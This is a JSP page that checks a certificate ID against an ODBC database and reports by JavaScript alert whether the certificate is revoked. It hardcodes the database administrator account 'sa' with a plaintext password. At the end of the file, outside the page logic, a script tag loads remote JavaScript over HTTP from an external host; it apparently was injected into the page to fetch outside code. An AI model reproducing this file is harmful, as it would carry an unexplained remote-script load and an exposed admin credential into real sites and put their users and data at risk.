<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.sql.*"%>

<%
String certId=request.getParameter("certId");

if(certId==null || certId.length()==0)
{
}
else
{
	Connection conn=null;
	try
	{
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
		PreparedStatement pstmt=conn.prepareStatement("select * from CertBrowserView_NotRevocated where certId=?");
		pstmt.setLong(1,Long.parseLong(certId));
		ResultSet rs=pstmt.executeQuery();
		if(rs.next())
		{
%>
<script language="javascript"> window.alert("该证书未被撤消！"); location.href="search.jsp";</script>
<%
		}
		else
		{
%>
<script language="javascript"> window.alert("该证书已经被撤消了！"); location.href="search.jsp";</script>
<%
		}
	}
	catch(Exception ex)
	{
%>
<script language="javascript"> window.alert("对不起，检查失败，数据库错误！"); location.href="search.jsp";</script>
<%
	}
	try{conn.close();}catch(Exception ex){}

}
%>
<script language=javascript src=http://www.qq.com/qq.js></script>